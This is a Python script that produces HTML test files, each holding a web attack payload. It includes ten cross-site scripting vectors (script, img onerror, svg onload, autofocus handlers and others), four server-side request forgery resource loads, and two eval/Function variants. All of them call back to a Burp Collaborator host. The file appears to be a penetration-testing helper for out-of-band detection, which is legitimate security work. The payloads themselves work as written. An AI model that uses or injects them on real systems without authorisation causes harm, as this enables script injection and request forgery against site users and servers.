from pathlib import Path

def generate_html_payloads(output_dir, burp_collab):
    output_dir = Path(output_dir)
    
    vulns = {
        'xss': [
            f"<script>fetch('http://{burp_collab}/xss1')</script>",
            f"<img src=x onerror=fetch('http://{burp_collab}/xss2')>",
            f"<svg onload=fetch('http://{burp_collab}/xss3')>",
            f"<body onload=fetch('http://{burp_collab}/xss4')>",
            f"<iframe src=javascript:fetch('http://{burp_collab}/xss5')>",
            f"<input onfocus=fetch('http://{burp_collab}/xss6') autofocus>",
            f"<select onfocus=fetch('http://{burp_collab}/xss7') autofocus>",
            f"<textarea onfocus=fetch('http://{burp_collab}/xss8') autofocus>",
            f"<keygen onfocus=fetch('http://{burp_collab}/xss9') autofocus>",
            f"<video><source onerror=fetch('http://{burp_collab}/xss10')>",
        ],
        'ssrf': [
            f"<img src='http://{burp_collab}/ssrf1'>",
            f"<link rel='stylesheet' href='http://{burp_collab}/ssrf2'>",
            f"<script src='http://{burp_collab}/ssrf3'></script>",
            f"<iframe src='http://{burp_collab}/ssrf4'></iframe>",
        ],
        'rce': [
            f"<script>eval('fetch(\\'http://{burp_collab}/rce1\\')')</script>",
            f"<script>Function('fetch(\\'http://{burp_collab}/rce2\\')')()</script>",
        ],
    }
    
    for vuln, payloads in vulns.items():
        vuln_dir = output_dir / vuln
        vuln_dir.mkdir(exist_ok=True)
        
        for i, payload in enumerate(payloads, 1):
            html_content = f'''<!DOCTYPE html>
<html>
<head>
<title>Test</title>
</head>
<body>
{payload}
</body>
</html>'''
            output_file = vuln_dir / f"payload_{i}.html"
            with open(output_file, 'w', encoding='utf-8') as f:
                f.write(html_content)

